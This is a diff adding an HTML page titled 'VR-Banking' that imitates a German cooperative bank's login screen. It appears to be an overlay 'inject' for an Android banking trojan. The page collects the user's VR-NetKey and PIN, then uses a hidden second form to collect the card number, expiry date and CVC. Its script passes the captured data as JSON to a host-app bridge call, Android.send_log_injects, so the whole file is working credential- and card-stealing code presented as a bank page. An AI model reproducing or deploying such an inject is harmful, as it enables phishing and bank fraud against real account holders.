@@ -1,0 +1,332 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>VR-Banking</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+    color: #bebebe;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    padding: 18px 0;
+    text-align: left;
+    box-shadow: 0px 0px 0px #ffffff;
+}
+.logo {
+    margin: 0 auto;
+    text-align: left;
+    color: #ffffff;
+    font-size: 1.2rem;
+    padding-left: 25px;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #3b3b3b;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    font-size: 1.125rem;
+    background: 0 0;
+    border: none;
+    color: #303030;
+    border-bottom: 1px solid rgb(102, 102, 102);
+    padding: 5px;
+    margin: 10px 0;
+    width: 100%;
+    border-radius: 0px;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 10px 0;
+    background-color: #0065b3;
+    border: none;
+    width: 100%;
+    height: 2rem;
+    overflow-x: auto;
+    border-radius: 20px;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #0065b3;
+    border-radius: 20px;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #ffffff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.usaalogo {
+    text-align: center;
+    margin-top: -30px;
+}
+.usaalogo img {
+    width: 70px;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+</style>
+<body>
+    <div class="header" style=" background-color: #0065b3; height: 50px;"><div class="logongardient">
+        <div class="logo" style="">Kennwort vergeben</div> 
+
+          <!-- <div class="usaalogo"><img style="width:px; margin-left: px; margin-top:px;" src=" " alt=""></div></div> -->
+
+        
+    </div>
+   
+    
+    <div class="main" style="margin-left: -30px;">
+        <div class="autorizeBox">
+            <form id="login" action="" style=""> 
+
+                          
+                         
+                         
+                 <p style="color:#000000; margin-left:0px; margin-top:-20px; font-size: 12px; font-weight:;">VR-NetKey, VR-Kennung oder Alias:</p>
+                             
+                               
+                    <input id="Login" style="font-size: 15px; margin-top: -10px;" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required>
+               
+                         
+               
+                    <p style="color:#000000; margin-left:0px; margin-top:0px; font-size: 12px; font-weight:;">PIN</p>
+                  
+
+                    <input id="Password" style="font-size: 15px; margin-top: -10px;" placeholder="" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <br></br>
+                    <br>
+                    <p style="color:#000000; margin-left:0px; margin-top:0px; font-size: 12px; font-weight:;">Kennwortstärke</p>
+                    <hr style="width: 105%; height: 3px; border: none; color:rgb(221, 221, 221); background-color:rgb(221, 221, 221); margin-top: -2px;">
+                    
+                    <p class="footerCopyright" style="margin-left:20px; color: rgb(0, 0, 0); font-size: 11.6px; margin-top: 7px;">Eine Kombination Groß-und Kleinbuchstaben, Zahlen und Sonderzeichen erhöht  die Sicherheit ihres Kennwortes.</p>
+                    
+                    <br></br>
+                    
+                    <button type="button" onclick="process('login')"><span>Anmelden</span></button>
+                    <input id="type_injects" value='banks' type="hidden" required>
+                    <p class="footerCopyright" style="margin-left:20px; color: rgb(0, 0, 0); font-size: 11.6px; margin-top: 7px;">Zugangsdaten vergessen/Zugang gesperrt?</p>
+
+                   
+            </form>
+            <form id="CC" action="" style="display:none;">
+                    <input id="CCNUM" placeholder="Kartennummer" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
+                    <span id="ccnumlbl"></span>
+                    <br><label>Datum: </label>
+                    <input class="dt" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
+                    <input class="dt" id="CCEXPYY" placeholder="JJ" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
+                    <br><label>CVC codes: </label>
+                    <input id="CVV" placeholder="CVC" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" style="width:15%;" required>
+                    <input id="type_injects" value='banks' type="hidden" required>
+                    <input id="closed" value='close_activity_injects' type="hidden" required>
+                    <button type="button" onclick="process('CC')"><span>LOG ON</span></button>
+            </form>
+          
+        </div>
+    </div>
+</body>
+<script>
+var invalidCC = 'Invalid card number';
+
+function maskCC(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < v.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var arrtagsID = [ 'CCexpMM', 'CCEXPYY', 'CVV'];
+for(var iid in arrtagsID) {
+    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+	if (/[^0-9-\s]+/.test(value)) return false;
+	var nCheck = 0, nDigit = 0, bEven = false;
+	value = value.replace(/\D/g, "");
+	for (var n = value.length - 1; n >= 0; n--) {
+		var cDigit = value.charAt(n),
+			  nDigit = parseInt(cDigit, 10);
+		if (bEven) {
+			if ((nDigit *= 2) > 9) nDigit -= 9;
+		}
+		nCheck += nDigit;
+		bEven = !bEven;
+	}
+	return (nCheck % 10) == 0;
+}
+
+var allButtons = document.getElementsByTagName('button');
+for(var btn in allButtons) {
+    allButtons[btn].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+	var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+function formChange(formId) {
+    for(var i = 0; i < AllForms.length; i++) {
+        AllForms[i].style.display = 'none';
+        if(AllForms[i].id == formId) {
+            AllForms[i+1].style.display = '';
+            break;
+        }
+    }
+}
+
+for(var i = 0; i < AllForms.length; i++) {
+    var myInputs = AllForms[i].getElementsByTagName('input');
+    for(var j = 0; j < myInputs.length; j++) {
+        AddInputEventByFormID(myInputs[j],AllForms[i].id);
+    }
+}
+
+function AddInputEventByFormID(input, formid) {
+    input.addEventListener('input', function(){CheckValidInput(formid)});
+}
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
